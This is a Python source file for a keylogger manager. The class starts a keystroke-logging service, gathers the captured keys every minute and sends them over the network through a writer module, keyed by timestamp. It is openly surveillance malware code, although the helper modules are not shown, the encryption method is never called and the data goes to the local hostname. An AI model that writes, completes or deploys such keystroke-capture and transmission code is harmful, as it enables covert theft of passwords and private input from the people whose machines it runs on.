from datetime import datetime
import socket
import time
from key_logger_service import KeyLoggerService
from encryptor import Encryptor
from network_writer import NetworkWriter


class KeyLoggerManager:
    def __init__(self):
        self.key_logger = KeyLoggerService()
        self.encryptor = Encryptor()
        self.network_writer = NetworkWriter()
        self.buffer = {}
        self.last_sent_minute = None

    def run_logger_loop(self):
        self.key_logger.start_logging()

        try:
            while True:
                current_time = datetime.now().strftime("%Y-%m-%d %H_%M")

                if self.last_sent_minute is None or current_time != self.last_sent_minute:
                    self.buffer = self.get_recently_logged_keys()
                    if self.buffer:
                        self.last_sent_minute = current_time
                        self.send_logged_keys(self.buffer)
                time.sleep(1)

        except KeyboardInterrupt:
            self.key_logger.stop_logging()

    def get_recently_logged_keys(self):
        return self.key_logger.get_logged_keys()

    def encrypt_logged_keys(self, logs):
        return self.encryptor.encrypt(logs)

    def send_logged_keys(self, encrypted_data):
        machine_name = socket.gethostname()
        payload = {self.last_sent_minute: encrypted_data}
        print(f" Sending data: {payload} to {machine_name}")

        self.network_writer.send_data(payload, machine_name)